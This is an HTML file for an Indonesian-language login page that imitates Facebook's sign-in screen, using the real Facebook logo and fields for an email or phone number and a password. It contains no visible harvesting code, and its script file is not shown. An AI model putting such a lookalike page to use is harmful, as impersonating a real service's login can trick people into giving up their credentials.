<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="facbook">
        <div class="card">
            <form action="" method="post" id="formLogin">
                <p class="login-title">Login ke Facebook</p>
    
                <div class="input-contain">
                    <input name="email" class="input" type="text" placeholder="Email atau Nomor Telepon" required id="email">
                    <span id="email-oninput"></span>

                    <div class="passContainer">
                        <input class="input" type="password" placeholder="Masukkan Kata Sandi" required id="password">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24px" height="24px" viewBox="0 0 24 24" fill="none" id="showPass">
                        <g clip-path="url(#clip0_15_200)">
                        <rect width="24" height="24" fill="white"/>
                        <circle cx="12" cy="13" r="2" stroke="#000000" stroke-linejoin="round"/>
                        <path d="M12 7.5C7.69517 7.5 4.47617 11.0833 3.39473 12.4653C3.14595 12.7832 3.14595 13.2168 3.39473 13.5347C4.47617 14.9167 7.69517 18.5 12 18.5C16.3048 18.5 19.5238 14.9167 20.6053 13.5347C20.8541 13.2168 20.8541 12.7832 20.6053 12.4653C19.5238 11.0833 16.3048 7.5 12 7.5Z" stroke="#000000" stroke-linecap="round" stroke-linejoin="round"/>
                        </g>
                        <defs>
                        <clipPath id="clip0_15_200">
                        <rect width="24" height="24" fill="white"/>
                        </clipPath>
                        </defs>
                        </svg>
                    </div>

                    <p id="message"></p>
                    <button type="submit" class="btn-submit" id="btnLogin">Masuk</button>
                    <button type="reset" class="reset">Reset</button>
                    <a href="forgot-acc.html" class="forgot-acc">Lupa Akun?</a>
                </div>
        
                <p class="atau">atau</p>

                <div class="contain-create">
                    <a href="#" class="create-acc">Buat Akun Baru</a>
                </div>
            </form>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
